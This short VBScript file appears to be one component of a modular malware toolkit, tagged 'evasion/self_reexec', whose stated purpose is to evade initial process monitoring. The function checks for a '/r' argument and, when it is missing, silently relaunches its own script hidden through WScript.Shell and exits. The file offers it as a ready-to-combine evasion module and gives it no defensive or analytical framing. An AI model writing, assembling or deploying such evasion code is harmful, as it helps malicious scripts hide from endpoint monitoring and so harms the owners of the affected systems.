' chunk: evasion/self_reexec
' depends: (none)
' provides: check_reexec
' format: vbscript
' note: Re-launch self with flag to evade initial process monitoring

Function check_reexec()
    check_reexec = False
    On Error Resume Next
    Dim args, hasFlag, i
    Set args = WScript.Arguments
    hasFlag = False
    For i = 0 To args.Count - 1
        If args(i) = "/r" Then
            hasFlag = True
        End If
    Next
    If Not hasFlag Then
        Dim sh
        Set sh = CreateObject("WScript.Shell")
        sh.Run "wscript.exe """ & WScript.ScriptFullName & """ /r", 0, False
        WScript.Quit
    End If
End Function
